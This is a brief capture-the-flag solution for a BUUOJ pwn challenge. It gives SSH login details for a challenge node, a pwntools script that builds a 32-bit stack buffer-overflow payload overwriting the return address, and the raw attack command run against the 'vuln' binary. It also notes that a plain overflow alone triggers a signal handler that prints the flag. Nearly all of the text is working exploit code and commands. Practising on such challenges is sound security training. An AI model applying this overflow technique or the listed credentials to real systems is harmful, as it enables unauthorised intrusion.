

# first step
# use ssh login in
"ssh CTFMan@node4.buuoj.cn -p 27676"
"password: guest"

# second step
# use vuln to attack
from pwn import *

pad = cyclic(0x18+0x4)+p32(0x80484c0)+p32(0)+p32(0x0804A080)
print(pad)

# attack command
"./vuln aaaabaaacaaadaaaeaaafaaagaaa\xc0\x84\x04\x08\x00\x00\x00\x00\x80\xa0\x04\x08"

# because the "sigsegv_handler" func
# this command also can attack
"./vuln aaaabaaacaaadaaaeaaafaaagaaa" 

